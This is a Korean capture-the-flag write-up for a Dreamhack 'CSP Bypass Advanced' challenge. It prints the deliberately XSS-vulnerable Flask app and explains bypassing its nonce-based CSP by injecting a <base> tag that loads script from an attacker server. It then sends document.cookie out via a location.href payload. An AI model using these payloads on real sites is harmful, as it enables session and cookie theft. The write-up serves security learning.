## CSP Bypass Advanced
<hr style="border-top: 1px solid;"><br>

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return render_template("vuln.html", param=param, nonce=nonce)


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)


app.run(host="0.0.0.0", port=8000)
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

vuln.html 코드를 보면 ```param | safe```가 있는데 render_template로 리턴을 하면 html entity encoding이 되지만 safe를 사용하면 escape가 된다고 한다.

따라서 태그를 사용하면 그대로 출력되므로 xss 공격이 가능하다.

<br>

CSP Bypass 문제와 똑같이 입력해본 뒤 console 창을 확인하면 ```Uncaught SyntaxError: Unexpected token '<' (at vuln?param=alert():1:1)``` 에러가 뜬다.

source 탭을 확인해보면 ```<!doctype html>``` 에서 막힌 걸 알 수 있다. 

그 이유는 vuln 페이지에서 자바스크립트 코드만 나오지 않고 항상 처음에 ```<!DOCTYPE html>```가 있는 완전한 html문서가 나와 첫 줄부터 ```<```를 만나서 자바스크립트 해석에 에러가 생기기 때문이라고 한다.
: CSP Bypass 문제에서는 스크립트 코드를 입력하면 스크립트 코드만 있어서 실행된 것.

<br>

그럼 ```<script src=''>```를 이용해서 자바스크립트 코드를 불러오는 방법은 할 수 없는데 어떻게 해야 하는가?

문제에서 설정된 정책을 보면 ```base-uri``` 정책이 none으로 설정되어 있지 않다. 강의에서 ```base-uri``` 정책이 설정되지 않으면 발생하는 취약점이 설명되어 있다.

<br>

코드를 보면 ```<script src="/static/js/jquery.min.js" nonce=c7a587423b15cc87ec066f7b0e2e5984></script>```가 있다. 

```<base>``` 태그를 이용해 경로를 내 서버로 변경하면 ```<script src="/static/js/jquery.min.js">```는 내 서버에 있는 ```/static/js/jquery.min.js```에서 코드를 가져올 것이다.

이렇게 하면 ```script-src 'self'``` 정책을 위반하지 않는다. 

<br><br>

replit을 통해 flask로 서버를 연 뒤,  ```/static/js/jquery.min.js```를 추가한 뒤 ```alert(1)```을 저장한다. 

그 다음 ```/vuln``` 페이지에서 ```<base href="URL">```을 입력해주면 alert가 실행된다.

공격 코드로 ```location.href="http://localhost:8000/memo?memo='+document.cookie"``` 또는 dreamhack에서 제공하는 request bin 주소로 쿠키 값을 보내면 된다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## 알아낸 점
<hr style="border-top: 1px solid;"><br>

Link
: <a href="https://ind2x.github.io/posts/dreamhack_relative_path_overwrite/#solution-1" target="_blank">ind2x.github.io/posts/dreamhack_relative_path_overwrite/#solution-1</a>

<br>

base 태그를 사용할 때는 head에서 사용해야 된다고 되어있는데 그 이유는 base 태그가 사용된 위치에서부터 적용되기 때문이다.

head에서 사용되면 head는 맨 위에 있기 때문에 전체적으로 적용이 가능하기 때문이다.

중간에서 사용되면 중간부터 적용되므로 위의 문제에서도 중간에서 적용되어서 그 아래에 있는 script 코드에서는 변경된 base url이 적용되어서 문제가 풀린 것.

<br><br>
<hr style="border: 2px solid;">
<br><br>

